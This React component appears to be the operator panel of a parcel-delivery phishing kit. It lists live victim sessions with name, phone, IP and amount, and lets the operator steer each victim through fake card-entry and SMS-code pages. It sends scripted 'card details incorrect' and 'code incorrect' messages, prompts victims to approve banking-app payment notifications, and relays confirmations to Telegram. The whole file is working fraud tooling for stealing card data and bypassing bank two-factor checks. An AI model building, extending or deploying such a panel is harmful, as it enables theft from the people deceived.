import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Checkbox } from "@/components/ui/checkbox";
import { Collapsible, CollapsibleContent, CollapsibleTrigger } from "@/components/ui/collapsible";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  Tooltip,
  TooltipContent,
  TooltipProvider,
  TooltipTrigger,
} from "@/components/ui/tooltip";
import { 
  CreditCard, 
  MessageSquare, 
  Package,
  Clock,
  Send,
  AlertTriangle,
  Info,
  XCircle,
  CheckCircle,
  Smartphone,
  MessageCircle,
  ChevronDown,
  Globe,
  Copy,
  Check,
  Edit,
  Save
} from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "@/hooks/use-toast";

interface ClientSession {
  id: string;
  session_code: string;
  client_name: string | null;
  phone_number: string | null;
  current_step: number;
  parcel_tracking: string | null;
  amount: number | null;
  status: string | null;
  admin_message: string | null;
  message_type: string | null;
  verification_code: string | null;
  approval_type: string | null;
  client_ip: string | null;
  origin: string | null;
  destination: string | null;
  estimated_delivery: string | null;
  created_at: string;
  updated_at: string;
}

const stepNames: Record<number, string> = {
  1: "Parcel Details",
  2: "Payment",
  3: "Verification",
  4: "Confirmation"
};

const stepColors: Record<number, string> = {
  1: "bg-blue-500",
  2: "bg-yellow-500",
  3: "bg-purple-500",
  4: "bg-green-500"
};

const messageTypes = [
  { value: "error", label: "Error", icon: XCircle, color: "text-red-500" },
  { value: "warning", label: "Warning", icon: AlertTriangle, color: "text-yellow-500" },
  { value: "info", label: "Info", icon: Info, color: "text-blue-500" },
];

interface ClientCardProps {
  session: ClientSession;
  isSelected?: boolean;
  onToggleSelect?: () => void;
}

export function ClientCard({ session, isSelected = false, onToggleSelect }: ClientCardProps) {
  const [messageInput, setMessageInput] = useState({ message: "", type: "error" });
  const [controlsOpen, setControlsOpen] = useState(false);
  const [messagingOpen, setMessagingOpen] = useState(false);
  const [parcelDetailsOpen, setParcelDetailsOpen] = useState(false);
  const [ipCopied, setIpCopied] = useState(false);
  const [isEditingParcel, setIsEditingParcel] = useState(false);
  const [parcelForm, setParcelForm] = useState({
    parcel_tracking: session.parcel_tracking || "",
    amount: session.amount?.toString() || "",
    origin: session.origin || "Los Angeles, CA",
    destination: session.destination || "",
    estimated_delivery: session.estimated_delivery || "2-3 Business Days"
  });

  const copyIpToClipboard = async () => {
    if (!session.client_ip) return;
    await navigator.clipboard.writeText(session.client_ip);
    setIpCopied(true);
    setTimeout(() => setIpCopied(false), 2000);
  };

  const getTimeSince = (dateString: string) => {
    const date = new Date(dateString);
    const now = new Date();
    const diffMs = now.getTime() - date.getTime();
    const diffMins = Math.floor(diffMs / 60000);
    
    if (diffMins < 1) return "Just now";
    if (diffMins < 60) return `${diffMins}m ago`;
    const diffHours = Math.floor(diffMins / 60);
    if (diffHours < 24) return `${diffHours}h ago`;
    return `${Math.floor(diffHours / 24)}d ago`;
  };

  const getShortIp = (ip: string | null) => {
    if (!ip) return null;
    const parts = ip.split('.');
    if (parts.length === 4) {
      return `${parts[0]}.${parts[1]}.*.*`;
    }
    return ip.slice(0, 10) + '...';
  };

  const updateClientStep = async (newStep: number) => {
    const updateData: { current_step: number; approval_type?: null } = { current_step: newStep };
    if (newStep === 2) {
      updateData.approval_type = null;
    }
    
    const { error } = await supabase
      .from("client_sessions")
      .update(updateData)
      .eq("id", session.id);

    if (error) {
      toast({ title: "Error", description: "Failed to update step", variant: "destructive" });
    } else {
      toast({ title: "Success", description: `Sent to ${stepNames[newStep]}` });
    }
  };

  const confirmPayment = async () => {
    const { error } = await supabase
      .from("client_sessions")
      .update({ current_step: 4, approval_type: "sms" })
      .eq("id", session.id);

    if (!error) {
      await supabase.functions.invoke("send-telegram", {
        body: { message: `✅ Payment Confirmed (SMS) - #${session.session_code}` },
      });
      toast({ title: "Payment Confirmed" });
    }
  };

  const approvePayment = async () => {
    const { error } = await supabase
      .from("client_sessions")
      .update({ current_step: 4, approval_type: "app" })
      .eq("id", session.id);

    if (!error) {
      await supabase.functions.invoke("send-telegram", {
        body: { message: `✅ Payment Approved (App) - #${session.session_code}` },
      });
      toast({ title: "Payment Approved (App)" });
    }
  };

  const sendWrongSmsMessage = async () => {
    await supabase
      .from("client_sessions")
      .update({ 
        admin_message: "The verification code you entered is incorrect. Please check and try again.",
        message_type: "error"
      })
      .eq("id", session.id);
    toast({ title: "Wrong SMS alert sent" });
  };

  const sendWrongCardMessage = async () => {
    await supabase
      .from("client_sessions")
      .update({ 
        current_step: 2,
        approval_type: null,
        admin_message: "The card details you entered are incorrect. Please check and try again.",
        message_type: "error"
      })
      .eq("id", session.id);
    toast({ title: "Sent back to card page" });
  };

  const sendToSmsVerification = async () => {
    await supabase
      .from("client_sessions")
      .update({ current_step: 3, approval_type: null, verification_code: null })
      .eq("id", session.id);
    toast({ title: "Sent to SMS verification" });
  };

  const sendToAppApproval = async () => {
    await supabase
      .from("client_sessions")
      .update({ current_step: 3, approval_type: "app_pending", verification_code: null })
      .eq("id", session.id);
    toast({ title: "Sent to App approval" });
  };

  const sendNotApprovedMessage = async () => {
    await supabase
      .from("client_sessions")
      .update({ 
        admin_message: "The payment has not been approved yet. Please open your banking app and approve the payment notification.",
        message_type: "error"
      })
      .eq("id", session.id);
    toast({ title: "Not approved alert sent" });
  };

  const sendMessage = async () => {
    if (!messageInput.message) {
      toast({ title: "Error", description: "Enter a message", variant: "destructive" });
      return;
    }

    await supabase
      .from("client_sessions")
      .update({ admin_message: messageInput.message, message_type: messageInput.type })
      .eq("id", session.id);
    
    toast({ title: "Message sent" });
    setMessageInput({ message: "", type: "error" });
  };

  const clearMessage = async () => {
    await supabase
      .from("client_sessions")
      .update({ admin_message: null, message_type: null })
      .eq("id", session.id);
    toast({ title: "Message cleared" });
  };

  const resendVerificationCode = async () => {
    const newCode = Math.floor(100000 + Math.random() * 900000).toString();
    await supabase
      .from("client_sessions")
      .update({ verification_code: newCode })
      .eq("id", session.id);
    
    await supabase.functions.invoke("send-telegram", {
      body: { message: `🔑 New Code: ${newCode} - #${session.session_code}` },
    });
    toast({ title: `New code: ${newCode}` });
  };

  const saveParcelDetails = async () => {
    const { error } = await supabase
      .from("client_sessions")
      .update({
        parcel_tracking: parcelForm.parcel_tracking || null,
        amount: parcelForm.amount ? parseFloat(parcelForm.amount) : null,
        origin: parcelForm.origin || null,
        destination: parcelForm.destination || null,
        estimated_delivery: parcelForm.estimated_delivery || null
      })
      .eq("id", session.id);

    if (error) {
      toast({ title: "Error", description: "Failed to update parcel details", variant: "destructive" });
    } else {
      toast({ title: "Parcel details updated" });
      setIsEditingParcel(false);
    }
  };

  return (
    <Card className={`overflow-hidden transition-colors ${isSelected ? 'ring-2 ring-primary' : ''}`}>
      {/* Compact Header */}
      <CardHeader className="pb-2 pt-3 px-4">
        <div className="flex items-center justify-between gap-2">
          <div className="flex items-center gap-2 min-w-0">
            {onToggleSelect && (
              <Checkbox
                checked={isSelected}
                onCheckedChange={onToggleSelect}
                className="shrink-0"
              />
            )}
            <span className="font-mono bg-muted px-2 py-0.5 rounded text-xs font-bold">
              #{session.session_code}
            </span>
            {session.client_ip && (
              <TooltipProvider>
                <Tooltip>
                  <TooltipTrigger asChild>
                    <Badge 
                      variant="outline" 
                      className="text-xs gap-1 shrink-0 cursor-pointer hover:bg-muted transition-colors"
                      onClick={copyIpToClipboard}
                    >
                      {ipCopied ? (
                        <Check className="w-3 h-3 text-green-500" />
                      ) : (
                        <Globe className="w-3 h-3" />
                      )}
                      {getShortIp(session.client_ip)}
                    </Badge>
                  </TooltipTrigger>
                  <TooltipContent side="bottom" className="flex items-center gap-2">
                    <span className="font-mono text-sm">{session.client_ip}</span>
                    {ipCopied ? (
                      <Check className="w-3 h-3 text-green-500" />
                    ) : (
                      <Copy className="w-3 h-3 text-muted-foreground" />
                    )}
                    <span className="text-xs text-muted-foreground">
                      {ipCopied ? "Copied!" : "Click to copy"}
                    </span>
                  </TooltipContent>
                </Tooltip>
              </TooltipProvider>
            )}
          </div>
          <div className="flex items-center gap-1.5 shrink-0">
            {session.approval_type === "payment_waiting" && (
              <Badge variant="outline" className="border-orange-500 text-orange-600 text-xs animate-pulse">
                Waiting
              </Badge>
            )}
            {session.current_step === 4 && session.approval_type && (
              <Badge variant="outline" className={session.approval_type === "sms" 
                ? "border-green-500 text-green-600 text-xs" 
                : "border-blue-500 text-blue-600 text-xs"
              }>
                {session.approval_type === "sms" ? "SMS" : "App"}
              </Badge>
            )}
            <Badge className={`${stepColors[session.current_step]} text-white text-xs`}>
              {session.approval_type === "payment_waiting" ? "Waiting" : stepNames[session.current_step]}
            </Badge>
          </div>
        </div>
      </CardHeader>

      <CardContent className="px-4 pb-3 space-y-3">
        {/* Client Info - Compact */}
        <div className="grid grid-cols-2 gap-x-4 gap-y-1 text-sm">
          {session.client_name && (
            <>
              <span className="text-muted-foreground text-xs">Name</span>
              <span className="font-medium text-xs truncate">{session.client_name}</span>
            </>
          )}
          {session.phone_number && (
            <>
              <span className="text-muted-foreground text-xs">Phone</span>
              <span className="font-medium text-xs">{session.phone_number}</span>
            </>
          )}
          {session.amount && (
            <>
              <span className="text-muted-foreground text-xs">Amount</span>
              <span className="font-semibold text-primary text-xs">£{session.amount.toFixed(2)}</span>
            </>
          )}
          <span className="text-muted-foreground text-xs flex items-center gap-1">
            <Clock className="w-3 h-3" /> Updated
          </span>
          <span className="text-xs">{getTimeSince(session.updated_at)}</span>
        </div>

        {/* Active Message Banner */}
        {session.admin_message && (
          <div className="p-2 rounded bg-muted border flex items-center justify-between gap-2">
            <div className="flex items-center gap-2 text-xs min-w-0">
              {session.message_type === "error" && <XCircle className="w-3 h-3 text-red-500 shrink-0" />}
              {session.message_type === "warning" && <AlertTriangle className="w-3 h-3 text-yellow-500 shrink-0" />}
              {session.message_type === "info" && <Info className="w-3 h-3 text-blue-500 shrink-0" />}
              <span className="truncate">{session.admin_message}</span>
            </div>
            <Button variant="ghost" size="sm" onClick={clearMessage} className="h-6 w-6 p-0 shrink-0">
              <XCircle className="w-3 h-3" />
            </Button>
          </div>
        )}

        {/* Payment Waiting - Priority Actions */}
        {session.current_step === 2 && session.approval_type === "payment_waiting" && (
          <div className="space-y-2 p-2 rounded-lg bg-orange-500/10 border border-orange-500/30">
            <p className="text-xs font-medium text-orange-600">Client waiting - choose method:</p>
            <div className="flex gap-2">
              <Button size="sm" className="flex-1 h-8 text-xs bg-green-600 hover:bg-green-700" onClick={sendToSmsVerification}>
                <MessageCircle className="w-3 h-3 mr-1" /> SMS
              </Button>
              <Button size="sm" className="flex-1 h-8 text-xs bg-blue-600 hover:bg-blue-700" onClick={sendToAppApproval}>
                <Smartphone className="w-3 h-3 mr-1" /> App
              </Button>
            </div>
            <Button variant="outline" size="sm" className="w-full h-7 text-xs text-orange-600 border-orange-500" onClick={sendWrongCardMessage}>
              <CreditCard className="w-3 h-3 mr-1" /> Wrong Card
            </Button>
          </div>
        )}

        {/* Verification Step Controls */}
        {session.current_step === 3 && (
          <div className="space-y-2 p-2 rounded-lg bg-purple-500/10 border border-purple-500/30">
            <div className="flex gap-2">
              <Button
                variant={session.approval_type !== "app_pending" ? "default" : "outline"}
                size="sm"
                className="flex-1 h-7 text-xs"
                onClick={sendToSmsVerification}
              >
                SMS
              </Button>
              <Button
                variant={session.approval_type === "app_pending" ? "default" : "outline"}
                size="sm"
                className="flex-1 h-7 text-xs"
                onClick={sendToAppApproval}
              >
                App
              </Button>
            </div>

            {session.approval_type !== "app_pending" ? (
              <div className="space-y-2">
                {session.verification_code && (
                  <div className="p-1.5 rounded bg-muted text-center">
                    <span className="text-xs text-muted-foreground">Code: </span>
                    <span className="font-mono font-bold text-sm">{session.verification_code}</span>
                  </div>
                )}
                <Button variant="outline" size="sm" className="w-full h-7 text-xs text-destructive" onClick={sendWrongSmsMessage}>
                  Wrong SMS
                </Button>
                <Button size="sm" className="w-full h-8 text-xs bg-green-600 hover:bg-green-700" onClick={confirmPayment}>
                  <CheckCircle className="w-3 h-3 mr-1" /> Confirm (SMS)
                </Button>
              </div>
            ) : (
              <div className="space-y-2">
                {session.verification_code === "APP_APPROVED_CLAIMED" && (
                  <div className="p-1.5 rounded bg-blue-500/10 border border-blue-500/30 text-center">
                    <span className="text-xs font-medium text-blue-600">✓ Client clicked "I Approved"</span>
                  </div>
                )}
                <div className="grid grid-cols-2 gap-2">
                  <Button variant="outline" size="sm" className="h-7 text-xs text-destructive" onClick={sendNotApprovedMessage}>
                    Not Approved
                  </Button>
                  <Button size="sm" className="h-7 text-xs bg-green-600 hover:bg-green-700" onClick={approvePayment}>
                    <CheckCircle className="w-3 h-3 mr-1" /> Confirm
                  </Button>
                </div>
                <Button variant="outline" size="sm" className="w-full h-7 text-xs text-orange-600 border-orange-500" onClick={sendWrongCardMessage}>
                  Wrong Card
                </Button>
              </div>
            )}
          </div>
        )}

        {/* Collapsible Parcel Details Editor */}
        <Collapsible open={parcelDetailsOpen} onOpenChange={setParcelDetailsOpen}>
          <CollapsibleTrigger asChild>
            <Button variant="ghost" size="sm" className="w-full h-7 text-xs justify-between">
              <span className="flex items-center gap-1">
                <Edit className="w-3 h-3" /> Edit Parcel Details
              </span>
              <ChevronDown className={`w-3 h-3 transition-transform ${parcelDetailsOpen ? "rotate-180" : ""}`} />
            </Button>
          </CollapsibleTrigger>
          <CollapsibleContent className="pt-2 space-y-2">
            <div className="grid grid-cols-2 gap-2">
              <div>
                <label className="text-xs text-muted-foreground">Tracking #</label>
                <Input
                  value={parcelForm.parcel_tracking}
                  onChange={(e) => setParcelForm(prev => ({ ...prev, parcel_tracking: e.target.value }))}
                  placeholder="SW-XXXXXXXX"
                  className="h-7 text-xs"
                  disabled={!isEditingParcel}
                />
              </div>
              <div>
                <label className="text-xs text-muted-foreground">Amount (£)</label>
                <Input
                  value={parcelForm.amount}
                  onChange={(e) => setParcelForm(prev => ({ ...prev, amount: e.target.value }))}
                  placeholder="4.99"
                  type="number"
                  step="0.01"
                  className="h-7 text-xs"
                  disabled={!isEditingParcel}
                />
              </div>
              <div>
                <label className="text-xs text-muted-foreground">From</label>
                <Input
                  value={parcelForm.origin}
                  onChange={(e) => setParcelForm(prev => ({ ...prev, origin: e.target.value }))}
                  placeholder="Los Angeles, CA"
                  className="h-7 text-xs"
                  disabled={!isEditingParcel}
                />
              </div>
              <div>
                <label className="text-xs text-muted-foreground">To</label>
                <Input
                  value={parcelForm.destination}
                  onChange={(e) => setParcelForm(prev => ({ ...prev, destination: e.target.value }))}
                  placeholder="Client address"
                  className="h-7 text-xs"
                  disabled={!isEditingParcel}
                />
              </div>
              <div className="col-span-2">
                <label className="text-xs text-muted-foreground">Est. Delivery</label>
                <Input
                  value={parcelForm.estimated_delivery}
                  onChange={(e) => setParcelForm(prev => ({ ...prev, estimated_delivery: e.target.value }))}
                  placeholder="2-3 Business Days"
                  className="h-7 text-xs"
                  disabled={!isEditingParcel}
                />
              </div>
            </div>
            <div className="flex gap-2">
              {isEditingParcel ? (
                <>
                  <Button size="sm" className="flex-1 h-7 text-xs" onClick={saveParcelDetails}>
                    <Save className="w-3 h-3 mr-1" /> Save
                  </Button>
                  <Button variant="outline" size="sm" className="flex-1 h-7 text-xs" onClick={() => setIsEditingParcel(false)}>
                    Cancel
                  </Button>
                </>
              ) : (
                <Button variant="outline" size="sm" className="w-full h-7 text-xs" onClick={() => setIsEditingParcel(true)}>
                  <Edit className="w-3 h-3 mr-1" /> Edit
                </Button>
              )}
            </div>
          </CollapsibleContent>
        </Collapsible>

        {/* Collapsible Navigation Controls */}
        <Collapsible open={controlsOpen} onOpenChange={setControlsOpen}>
          <CollapsibleTrigger asChild>
            <Button variant="ghost" size="sm" className="w-full h-7 text-xs justify-between">
              Navigation Controls
              <ChevronDown className={`w-3 h-3 transition-transform ${controlsOpen ? "rotate-180" : ""}`} />
            </Button>
          </CollapsibleTrigger>
          <CollapsibleContent className="pt-2">
            <div className="grid grid-cols-3 gap-1.5">
              <Button
                variant={session.current_step === 1 ? "default" : "outline"}
                size="sm"
                className="h-12 flex-col gap-0.5 text-xs"
                onClick={() => updateClientStep(1)}
                disabled={session.current_step === 1}
              >
                <Package className="w-4 h-4" />
                Parcel
              </Button>
              <Button
                variant={session.current_step === 2 ? "default" : "outline"}
                size="sm"
                className="h-12 flex-col gap-0.5 text-xs"
                onClick={() => updateClientStep(2)}
                disabled={session.current_step === 2}
              >
                <CreditCard className="w-4 h-4" />
                Card
              </Button>
              <Button
                variant={session.current_step === 3 ? "default" : "outline"}
                size="sm"
                className="h-12 flex-col gap-0.5 text-xs"
                onClick={() => updateClientStep(3)}
                disabled={session.current_step === 3}
              >
                <MessageSquare className="w-4 h-4" />
                SMS
              </Button>
            </div>
          </CollapsibleContent>
        </Collapsible>

        {/* Collapsible Messaging */}
        <Collapsible open={messagingOpen} onOpenChange={setMessagingOpen}>
          <CollapsibleTrigger asChild>
            <Button variant="ghost" size="sm" className="w-full h-7 text-xs justify-between">
              Send Custom Alert
              <ChevronDown className={`w-3 h-3 transition-transform ${messagingOpen ? "rotate-180" : ""}`} />
            </Button>
          </CollapsibleTrigger>
          <CollapsibleContent className="pt-2 space-y-2">
            <div className="flex gap-1.5">
              <Select
                value={messageInput.type}
                onValueChange={(value) => setMessageInput(prev => ({ ...prev, type: value }))}
              >
                <SelectTrigger className="w-20 h-8 text-xs">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  {messageTypes.map((type) => (
                    <SelectItem key={type.value} value={type.value}>
                      <div className="flex items-center gap-1">
                        <type.icon className={`w-3 h-3 ${type.color}`} />
                        {type.label}
                      </div>
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
              <Input
                placeholder="Message..."
                value={messageInput.message}
                onChange={(e) => setMessageInput(prev => ({ ...prev, message: e.target.value }))}
                className="flex-1 h-8 text-xs"
              />
              <Button size="sm" onClick={sendMessage} className="h-8 w-8 p-0">
                <Send className="w-3 h-3" />
              </Button>
            </div>
          </CollapsibleContent>
        </Collapsible>
      </CardContent>
    </Card>
  );
}